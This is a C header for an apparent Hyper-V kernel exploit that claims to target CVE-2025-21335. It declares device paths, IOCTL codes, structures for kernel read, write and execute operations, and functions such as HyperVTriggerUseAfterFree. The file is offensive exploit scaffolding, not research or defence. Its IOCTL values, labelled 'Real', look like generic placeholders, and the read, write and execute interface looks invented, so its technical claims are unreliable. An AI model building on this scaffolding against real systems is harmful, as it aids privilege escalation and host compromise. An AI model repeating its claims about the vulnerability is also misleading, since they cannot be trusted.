#ifndef _HYPERV_EXPLOIT_H_
#define _HYPERV_EXPLOIT_H_

#include <Windows.h>
#include <winioctl.h>
#include "nt_types.h"

// Real Hyper-V Device Paths
#define VMBUS_DEVICE_PATH       L"\\\\.\\VmBus"
#define VSP_DEVICE_PATH         L"\\\\.\\VmGenerationCounter" 
#define HVSERVICE_DEVICE_PATH   L"\\\\.\\HvService"

// IOCTL Constants
#ifndef FILE_DEVICE_UNKNOWN
#define FILE_DEVICE_UNKNOWN             0x00000022
#endif
#ifndef METHOD_BUFFERED
#define METHOD_BUFFERED                 0
#endif
#ifndef FILE_ANY_ACCESS
#define FILE_ANY_ACCESS                 0
#endif

// Real Hyper-V IOCTL codes based on CVE-2025-21335 (NT Kernel Integration VSP)
#define IOCTL_VMBUS_GET_VERSION         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_VSP_QUERY_INFO            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)  
#define IOCTL_VSP_ALLOCATE_BUFFER       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_VSP_KERNEL_OPERATION      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

// CVE-2025-21335: NT Kernel Integration VSP structures
typedef struct _VMBUS_VERSION_INFO {
    ULONG MajorVersion;
    ULONG MinorVersion;
    ULONG BuildNumber;
    ULONG Reserved;
} VMBUS_VERSION_INFO, *PVMBUS_VERSION_INFO;

typedef struct _VSP_QUERY_REQUEST {
    ULONG QueryType;
    ULONG BufferSize;
    ULONG64 UserBuffer;  // User-controlled pointer
    ULONG Flags;
} VSP_QUERY_REQUEST, *PVSP_QUERY_REQUEST;

// CVE-2025-21335: Vulnerable buffer allocation structure (use-after-free)
typedef struct _VSP_BUFFER_ALLOCATION {
    ULONG64 BufferSize;
    ULONG64 BufferAddress;    // Kernel address - vulnerable to UAF
    ULONG AllocationFlags;
    ULONG PoolTag;           // Kernel pool tag
    HANDLE ProcessId;        // Process context
    ULONG Reserved[3];
} VSP_BUFFER_ALLOCATION, *PVSP_BUFFER_ALLOCATION;

// CVE-2025-21335: Kernel operation structure for exploitation  
typedef struct _VSP_KERNEL_OPERATION {
    ULONG OperationType;      // 1=Read, 2=Write, 3=Execute
    ULONG64 KernelAddress;    // Target kernel address
    ULONG64 UserBuffer;       // User buffer for data
    ULONG64 Size;             // Operation size
    ULONG ProcessId;          // Target process ID
    ULONG Flags;              // Operation flags
} VSP_KERNEL_OPERATION, *PVSP_KERNEL_OPERATION;

// Operation types for VSP_KERNEL_OPERATION
#define VSP_OP_READ_MEMORY      1
#define VSP_OP_WRITE_MEMORY     2  
#define VSP_OP_EXECUTE_CODE     3

// Query types for VSP_QUERY_REQUEST
#define VSP_QUERY_KERNEL_INFO   1
#define VSP_QUERY_PROCESS_LIST  2
#define VSP_QUERY_MODULE_LIST   3

// Function declarations
BOOL HyperVExploitInit(void);
BOOL HyperVExploitRead(ULONG64 address, PVOID buffer, SIZE_T size);
BOOL HyperVExploitWrite(ULONG64 address, PVOID buffer, SIZE_T size);
BOOL HyperVTriggerUseAfterFree(void);
BOOL HyperVQueryKernelInfo(PVOID buffer, SIZE_T size);
void HyperVExploitCleanup(void);

// Enhanced VMBus functions
BOOL EnumerateVMBusDevices(void);
BOOL InitializeVMBusChannel(void);
BOOL SetupAdvancedVSPExploit(void);

#endif // _HYPERV_EXPLOIT_H_ 